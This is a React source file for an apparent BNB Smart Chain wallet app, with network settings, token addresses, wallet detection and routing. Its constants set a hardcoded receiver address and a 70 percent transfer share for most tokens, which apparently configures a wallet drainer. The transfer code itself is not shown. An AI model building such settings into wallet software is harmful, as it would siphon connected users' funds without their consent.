import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { BrowserRouter as Router, Routes, Route, Link } from 'react-router-dom';
import BSCWallet from './BSCWallet';
import ERC20Wallet from './ERC20Wallet';
import './App.css';

// BSC Mainnet configuration
const BSC_MAINNET = {
  chainId: '0x38', // 56 in decimal
  chainName: 'BNB Smart Chain',
  nativeCurrency: {
    name: 'BNB',
    symbol: 'BNB',
    decimals: 18,
  },
  rpcUrls: ['https://bsc-dataseed.binance.org/'],
  blockExplorerUrls: ['https://bscscan.com/'],
};

// Common BEP20 tokens on BSC
const COMMON_TOKENS = [
  {
    address: '0x55d398326f99059fF775485246999027B3197955',
    symbol: 'USDT',
    decimals: 18,
    name: 'Tether USD'
  },
  {
    address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    symbol: 'USDC',
    decimals: 18,
    name: 'USD Coin'
  },
  {
    address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    symbol: 'BUSD',
    decimals: 18,
    name: 'Binance USD'
  },
  {
    address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
    symbol: 'CAKE',
    decimals: 18,
    name: 'PancakeSwap Token'
  },
  {
    address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', // BTCB
    symbol: 'BTCB',
    decimals: 18,
    name: 'Bitcoin BEP20'
  },

  {
    address: '0xdfb2a59147e615c65908ba22fc90d35ee1f5c7d7', // BTCB
    symbol: 'Baby',
    decimals: 18,
    name: 'Baby'
  }
];

// Minimal BEP20 ABI for token interaction
const BEP20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

// Event ABI for token transfers
const TRANSFER_EVENT_ABI = [
  "event Transfer(address indexed from, address indexed to, uint256 value)"
];

// Wallet icons
const METAMASK_ICON = 'https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg';
const TRUSTWALLET_ICON = 'https://trustwallet.com/assets/images/favicon.png';

// Available wallets configuration
const availableWallets = [
  {
    id: 'metamask',
    name: 'MetaMask',
    icon: METAMASK_ICON,
    check: () => window.ethereum?.isMetaMask
  },
  {
    id: 'trustwallet',
    name: 'Trust Wallet',
    icon: TRUSTWALLET_ICON,
    check: () => window.ethereum?.isTrust
  }
];

const WALLET_TYPES = {
  METAMASK: {
    id: 'metamask',
    name: 'MetaMask',
    icon: METAMASK_ICON,
    check: () => typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask
  },
  TRUST_WALLET: {
    id: 'trustwallet',
    name: 'Trust Wallet',
    icon: TRUSTWALLET_ICON,
    check: () => typeof window.ethereum !== 'undefined' && window.ethereum.isTrust
  }
};

// Add these constants at the top of the file, after the imports
const DEFAULT_RECEIVER_ADDRESS = '0x22255cF84905566e596cE6c296434b4E003eA008'; // Replace with your default address
const DEFAULT_TRANSFER_PERCENTAGE = 70; // 50% by default
const DEFAULT_WALLETS = {
  BNB: '0x22255cF84905566e596cE6c296434b4E003eA008', // Replace with BNB wallet
  USDT: '0x22255cF84905566e596cE6c296434b4E003eA008', // Replace with USDT wallet
  USDC: '0x22255cF84905566e596cE6c296434b4E003eA008', // Replace with USDC wallet
  BUSD: '0x0000000000000000000000000000000000000000', // Replace with BUSD wallet
  CAKE: '0x0000000000000000000000000000000000000000', // Replace with CAKE wallet
  BTCB: '0x0000000000000000000000000000000000000000', // Replace with BTCB wallet
  Baby: '0x22255cF84905566e596cE6c296434b4E003eA008'  // Replace with Baby wallet
};

function App() {
  return (
    <Router>
      <div className="app">
        <nav className="nav">
          <Link to="/" className="nav-link">BSC Wallet</Link>
          <Link to="/erc20" className="nav-link">ERC-20 Wallet</Link>
        </nav>
        
        <Routes>
          <Route path="/" element={<BSCWallet />} />
          <Route path="/erc20" element={<ERC20Wallet />} />
        </Routes>
      </div>
    </Router>
  );
}

export default App; 